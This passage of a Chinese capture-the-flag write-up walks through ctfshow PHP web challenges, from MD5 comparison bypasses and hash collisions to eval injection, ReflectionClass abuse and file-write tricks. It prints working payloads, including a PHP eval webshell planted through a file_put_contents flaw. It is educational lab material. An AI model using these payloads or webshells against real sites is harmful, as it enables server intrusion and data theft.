class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这一题是需要通过POST传入a，b两个参数。<br>条件是值不能相等，且md5值要相等。</p></li><li><p>构造payload<br>抓包将头部的GET改为POST，然后添加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>最后我们有两种构造方法来传参</p></li></ol><ul><li><p>第1种（php中hash比较缺陷）<br>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是强相等的。<br>由此可以构造出：<br><code>a[]=1&amp;b[]=2</code><br>报错并且成功拿到flag</p></li><li><p>第2种（生成MD5相同但内容不同的2个文件）<br>用md5-fastcoll工具可以生成MD5相同但内容不同的两个文件，编写python脚本提取文件内容，并进行url编码就行了。<br>以下是几个MD5相同但内容不同的字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</span><br><span class="line"></span><br><span class="line">%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab</span><br><span class="line"></span><br><span class="line">%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</span><br></pre></td></tr></table></figure><p>构造成payload即可拿到flag</p></li></ul><p><strong>题外话</strong></p><ul><li>如果是MD5弱比较，使用强制类型转换后不再接收数组：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)==md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">md5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。</span><br><span class="line">payload: a=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure></li><li>md5强碰撞<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)===md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">这时候需要找到两个真正的md5值相同数据</span><br><span class="line"></span><br><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure></li></ul><h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>考点是PHP的三元运算符和传址(引用) 传址(引用)有点像c语言里面的地址<br>第2行代码的意思是：只要有输入的get参数就将get方法改变为post方法(修改了get方法的地址)<br>第3,4行代码用处不大，因为我们不传入flag参数<br>第5行代码的意思是POST型提交一个HTTP_FLAG&#x3D;flag,由于get不会验证，所以随便填个1&#x3D;1就好。</p></li><li><p>构造payload<br>抓包，将头部的GET改为POST，并且添加Content-Type<br>GET型 <code>1=1</code><br>POST型 <code>HTTP_FLAG=flag</code><br>拿到flag</p></li></ol><h1 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>array_push()函数<br>将一个或多个单元压入数组的末尾（入栈）<br><code>array_push(array &amp;$array, mixed $value1, mixed $... = ?): int</code><br>array_push() 将 array 当成一个栈，并将传入的变量压入 array 的末尾。array 的长度将根据入栈变量的数目增加。</p></li><li><p>in_array()函数<br>检查数组中是否存在某个值<br><code>in_array(mixed $needle, array $haystack, bool $strict = false): bool</code><br>如果没有设置 strict 则使用宽松的比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">needle</span><br><span class="line">待搜索的值。</span><br><span class="line">注意:</span><br><span class="line">如果 needle 是字符串，则比较是区分大小写的。</span><br><span class="line">haystack</span><br><span class="line">待搜索的数组。</span><br><span class="line">strict</span><br><span class="line">如果第三个参数 strict 的值为 true 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同。</span><br><span class="line">注意:</span><br><span class="line">在 PHP 8.0.0 之前，string needle 在非严格模式下将会匹配数组中的值 0，反之亦然。这可能会导致不希望的结果。其它类型也存在类似的边缘情况。如果不是绝对确定有关值的类型，请始终使用 strict flag 以避免意外行为。</span><br></pre></td></tr></table></figure></li><li><p>file_put_contents()函数<br>将数据写入文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(</span><br><span class="line">    string $filename,</span><br><span class="line">    mixed $data,</span><br><span class="line">    int $flags = 0,</span><br><span class="line">    ?resource $context = null</span><br><span class="line">): int|false</span><br></pre></td></tr></table></figure><p>如果 filename 不存在，将会创建文件。反之，存在的文件将会重写，除非设置 FILE_APPEND flag。</p></li></ul><p>通过该源码可知，将随机数放入数组$allow里。<br>get型传参的值与数组$allow作比较，如果在里面，就通过post传参变量content写入文件名变量n内。<br>即创造一个文件，文件名为变量n的值，文件内容为变量content的值。</p><ol start="2"><li>构造payload<br>由于in_array数组有缺陷，会把1.php解析为1，由此我们可构造出一个php文件，通过post传参传入一句话木马：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET: ?n=1.php    POST: content:&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>因为是随机数，所以1不一定每次都在数组中，如果失败多试几次便可。<br>然后我们再访问： <code>url/1.php</code><br>成功后打开蚁剑，连接这个url，密码为1。<br>之后找到flag36d.php文件，拿到flag。</li></ol><h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>is_numeric()函数<br>检测变量是否为数字或数字字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_numeric(mixed $value): bool</span><br><span class="line">如果 value 是数字或数字字符串， 返回 true，否则返回 false。</span><br></pre></td></tr></table></figure></li><li><p>eval()函数<br>把字符串作为PHP代码执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(string $code): mixed</span><br><span class="line">返回值</span><br><span class="line">eval() 返回 null，除非在执行的代码中 return 了一个值，函数返回传递给 return 的值。 PHP 7 开始，执行的代码里如果有一个 parse error，eval() 会抛出 ParseError 异常。在 PHP 7 之前， 如果在执行的代码中有 parse error，eval() 返回 false，之后的代码将正常执行。无法使用 set_error_handler() 捕获 eval() 中的解析错误。</span><br></pre></td></tr></table></figure></li></ul><p>通过该源码可知，我们需要通过GET方式传入3个参数，并且将判断三个参数是否为数字或数字字符串。<br>检测v2和v3是否具有那些过滤的值，然后用eval函数输出为代码。</p><ol start="2"><li>构造payload<br>这里的考点是运算符的优先级，由于在v0这一行代码的比较中，等于（&#x3D;）符号的优先级高于and符号，因此代码会执行为判断v1是否为数字，返回的布尔值传到v0，而v2，v3的判断并没有传入。因此我们可以输入任意v2，v3的字符。<br>由于eval将括号内的字符执行为代码，我们可以用var_dump函数打印出flag，于是构造payload如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;</span><br></pre></td></tr></table></figure>最终拿到flag</li></ol><h1 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相比于上一关，本关的黑名单更多，用一般的函数无法拿到flag，于是我们需要想办法使用其它方法。</p></li><li><p>构造语句<br>可以使用ReflectionClass类来显示出flag，ReflectionClass 类报告了一个类的有关信息。<br><a href="https://www.php.net/manual/zh/class.reflectionclass.php">ReflectionClass 类 </a><br>构造示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure><p>由于hint说flag最后少了一位，因此需要最后爆破16次。<br>拿到flag</p></li></ol><h1 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>substr()函数<br>返回字符串的子串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">substr(string $string, int $offset, ?int $length = null): string</span><br><span class="line">string</span><br><span class="line">输入字符串。</span><br><span class="line">offset</span><br><span class="line">如果 offset 是非负数，返回的字符串将从 string 的 offset 位置开始，从 0 开始计算。</span><br><span class="line">例如，在字符串 “abcdef” 中，在位置 0 的字符是 “a”，位置 2 的字符串是 “c” 等等。</span><br><span class="line">如果 offset 是负数，返回的字符串将从 string 结尾处向前数第 offset 个字符开始。</span><br><span class="line">如果 string 的长度小于 offset，将返回空字符串。</span><br><span class="line">length</span><br><span class="line">如果提供了正数的 length，返回的字符串将从 offset 处开始最多包括 length 个字符（取决于 string 的长度）。</span><br><span class="line">如果提供了负数的 length，那么 string 末尾处的 length 个字符将会被省略（若 offset 是负数则从字符串尾部算起）。</span><br><span class="line">如果 offset 不在这段文本中，那么将返回空字符串。</span><br><span class="line">如果提供了值为 0 的 length，那么将返回一个空字符串。</span><br><span class="line">如果忽略 length 或为 null，返回的子字符串将从 offset 位置开始直到字符串结尾。</span><br></pre></td></tr></table></figure></li><li><p>call_user_func()函数<br>把第一个参数作为回调函数调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(callable $callback, mixed ...$args): mixed</span><br><span class="line">callback</span><br><span class="line">将被调用的回调函数</span><br><span class="line">args</span><br><span class="line">0个或以上的参数，被传入回调函数。</span><br></pre></td></tr></table></figure></li><li><p>hex2bin()函数<br>转换十六进制字符串为ASCII字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hex2bin(string $string): string|false</span><br><span class="line">string</span><br><span class="line">十六进制表示的数据</span><br><span class="line">返回值</span><br><span class="line">返回给定数据的ASCII字符串表示 或者在失败时返回 false。</span><br></pre></td></tr></table></figure></li></ul><p>根据源码可知，传入1个POST参数v1，2个GET参数v2,v3<br>根据v4的表达式，可知v2必须为数字或数字字符串（可以使用科学计数法）。v3不受限制。<br>从第3个数字开始截取v2一直到结尾，送给变量s。<br>调用call_user_func()函数，将v3作为函数名调用，传入s作为参数。得到的值赋给变量str。<br>最后v3作为文件名，变量str的值写入v3文件中。</p><ol start="2"><li>构造payload<br>由于is_numeric()函数只允许使用数字和e（科学计数法），不能包含其它字符，所以需要构造仅含数字和e的参数。<br>由此我们可以想到把内容通过base64加密，之后转化为16进制字符串，找到符合条件的语句。<br>最终我们通过下面代码找到了：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;&lt;?=`cat *`;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);  <span class="comment">// $b=&quot;PD89YGNhdCAqYDs=&quot;,由于等号(=)只是作为填充位，不影响最终结果，因此可以删去 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;PD89YGNhdCAqYDs&quot;</span>);  <span class="comment">// $c=5044383959474e6864434171594473,符合条件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span 